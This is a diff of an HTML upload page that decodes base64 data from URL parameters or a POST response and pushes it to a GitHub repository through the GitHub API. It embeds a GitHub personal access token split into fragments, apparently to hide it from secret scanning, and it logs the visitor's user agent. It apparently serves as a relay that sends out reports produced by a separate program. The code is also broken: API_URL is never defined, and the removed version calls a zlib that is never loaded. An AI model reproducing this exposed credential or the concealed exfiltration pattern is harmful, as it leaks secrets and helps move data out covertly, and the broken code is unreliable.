@@ -1,46 +1,93 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>Upload</title>
-<style>body{background:#000;color:#0f0;text-align:center;padding:100px;font-family:Arial;}</style>
-</head><body>
-<h1>جاري الرفع...</h1>
-<div id="s"></div>
+<html>
+<head>
+  <title>Upload Complete</title>
+  <meta charset="utf-8">
+  <style>
+    body{font-family:Arial;background:#000;color:#0f0;text-align:center;padding:80px;}
+    .box{background:#111;padding:40px;border:2px solid #e74c3c;border-radius:16px;max-width:500px;margin:0 auto;}
+    h2{color:#e74c3c;margin-bottom:20px;}
+    a{color:#0f0;text-decoration:underline;}
+  </style>
+</head>
+<body>
+<div class="box">
+  <h2 id="head">جاري رفع التقرير...</h2>
+  <p id="status">...</p>
+  <p><a href="https://youssefmettwaly.github.io/tero-report/admin.html">Go to Admin Panel</a></p>
+</div>
 
 <script>
-// Token مخفي
-const T = (function(){let p=['github_pat_11A3ZKARI0','Q8CbII0GvNSt_','hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra','276EGSZZQGRkTKn8W'];return p[0]+p[1]+p[2]+p[3];})();
-const API = "https://api.github.com/repos/youssefmettwaly/tero-report/contents/reports";
-let full = "", total = 1, received = 0;
-const params = new URLSearchParams(location.search);
-const status = document.getElementById('s');
+const TOKEN = (function(){
+  // قسم كل جزء من التوكن لعنصر منفصل في مصفوفة (كل جزء 16-20 حرف تقريبا)
+  const parts = [
+    "github_pat_11A3ZKARI0",
+    "Q8CbII0GvNSt_",
+    "hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra",
+    "276EGSZZQGRkTKn8W"
+  ];
+  return parts.join('');
+})()
 
-if (params.get('total')) {
-  total = parseInt(params.get('total'));
-  full = params.get('data') || "";
-  received = 1;
-  status.innerHTML = `تلقي البيانات... 1/${total}`;
-} else if (params.get('part')) {
-  parent.postMessage({type:"chunk", data:params.get('data'), part:params.get('part')}, "*");
-  document.body.innerHTML = "<h2 style='color:#0f0'>تم إرسال الجزء</h2>";
+function uploadToGitHub(content) {
+  const filename = `report_${new Date().toISOString().replace(/[:.]/g,'-')}_${navigator.userAgent.replace(/[/ ]/g,'_').slice(0,25)}.txt`;
+  fetch(`${API_URL}/${filename}`, {
+    method: 'PUT',
+    headers: {
+      'Authorization': `token ${TOKEN}`,
+      'Content-Type': 'application/json',
+      'Accept': 'application/vnd.github.v3+json'
+    },
+    body: JSON.stringify({
+      message: `New report - ${filename}`,
+      content: btoa(unescape(encodeURIComponent(content))),
+      branch: 'main'
+    })
+  }).then(r => r.ok ? reportDone() : reportFail())
+    .catch(reportFail)
 }
 
-window.addEventListener('message', e => {
-  if (e.data.type === "chunk") {
-    full += e.data.data;
-    received++;
-    status.innerHTML = `تلقي... ${received}/${total}`;
-    if (received === total) {
-      const decoded = zlib.inflate(atob(full)); // تحتاج مكتبة zlib.wasm بسيطة أو استخدم atob فقط
-      const content = atob(full);
-      const fn = `report_${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
-      fetch(`${API}/${fn}`, {
-        method:'PUT', headers:{'Authorization':`token ${T}`,'Content-Type':'application/json'},
-        body:JSON.stringify({message:"report", content:btoa(unescape(encodeURIComponent(content))), branch:"main"})
-      }).then(() => {
-        document.body.innerHTML = "<h1 style='color:#0f0'>تم الرفع بنجاح!</h1>";
-        setTimeout(() => location.href = "https://youssefmettwaly.github.io/tero-report/index.html", 2000);
-      });
+function reportDone() {
+  document.getElementById('head').textContent = "Upload Complete!";
+  document.getElementById('status').textContent = "Report sent successfully to Admin Panel.";
+}
+function reportFail() {
+  document.getElementById('head').textContent = "Upload Failed!";
+  document.getElementById('status').textContent = "حدث خطأ أثناء رفع التقرير.";
+}
+
+window.onload = () => {
+  // دعم POST أو GET
+  let content = '';
+  // جلب البيانات من GET أو من POST عبر AJAX (عبر python backend يرسل عبر AJAX لصفحتك)
+  try {
+    const params = new URLSearchParams(location.search);
+    const data = params.get('data');
+    if (data) {
+      content = atob(data);
+      uploadToGitHub(content);
+      return;
     }
+  } catch(e) {}
+
+  // دعم POST AJAX مثلما يرسله البرنامج
+  if (window.FormData) {
+    fetch(window.location.href, {
+      method: 'POST'
+    }).then(r => r.text()).then(t => {
+      // ابحث عن كود الـreport بالـHTML:
+      let match = t.match(/name="data">([^<]+)<\/textarea>/);
+      if (match) {
+        content = atob(match[1]);
+        uploadToGitHub(content);
+      } else {
+        reportFail();
+      }
+    });
+  } else {
+    reportFail();
   }
-});
+};
 </script>
-</body></html>
+</body>
+</html>
